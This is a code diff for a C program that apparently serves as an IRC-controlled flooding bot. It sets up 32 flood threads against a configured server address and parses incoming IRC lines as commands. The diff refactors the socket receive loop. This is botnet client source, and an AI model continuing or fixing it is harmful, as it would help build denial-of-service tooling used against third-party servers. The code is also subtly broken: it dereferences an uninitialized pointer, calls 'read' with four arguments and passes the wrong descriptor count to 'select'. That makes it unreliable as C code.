@@ -1,10 +1,16 @@
+#include "config.h"
 
 int main(){
 
-    int sock;
+    int sock = 0, status = 0;
+    fd_set fds;
+    timeval tv;
+    tv.tv_sec = MAX_TIME_WAIT;
 
-    bool MPTCP_ENABLED = 0;
-    bool connected = 0;
+    bool MPTCP_ENABLED = 0, connected = 0;
+
+    int len = 0;
+    char buf[RECV_BUFFER_SIZE];
 
     int THREAD_NUM = 32;
     pthread_t threads[THREAD_NUM];
@@ -13,12 +19,6 @@ int main(){
     flood_args *args;
     args->addr = inet_addr(SERV_ADDR);
     args->port = htons(SERV_PORT);
-
-    char buf[RECV_BUFFER_SIZE];
-    int len;
-
-	//fd_set fds;
-	//int nRetVal;
 
 	while (1)
 	{
@@ -30,38 +30,34 @@ int main(){
 			connected = 1;
 			while (sock > 0)
 			{
-
-
-
-				//FD_ZERO(&fds);
-				//FD_SET(Sock, &fds);
+				FD_ZERO(&fds);
+				FD_SET(sock, &fds);
 
 				len = 0;
 				memset(buf, 0, sizeof(buf));
-				while ((nRetVal = select(Sock, &fds, NULL, NULL, &tv)) > 0)
-				{
-					if (len == RECV_BUFFER_SIZE - 1)break;
-					len += read(sock, buf + len, 1, 0);//
-					if (buf[len-1] == '\r' || buf[len-1] == '\n')break;
+				while ((status = select(sock, &fds, NULL, NULL, &tv)) > 0){
+					if (len == RECV_BUFFER_SIZE - 1){
+                            break;
+					}
+					len += read(sock, buf + len, 1, 0);
+					if (buf[len - 1] == '\r' || buf[len - 1] == '\n'){
+                            break;
+					}
 				}
-
-				if (nRetVal <= 0)break;
-				else if (len < 2)continue;
+				if (status <= 0){
+                    break;
+				}
+				else if (len < 2){
+                    continue;
+				}
 				else
 				{
-					buf[len-1] = 0;
-
+					buf[len - 1] = 0;
 					if(ircParse(buf) == 2){
                         close(sock);
                         return 0;
-
 					}
-
 				}
-
-
-
-
 			}
 			printf("Connection lost\n");
 			close(sock);
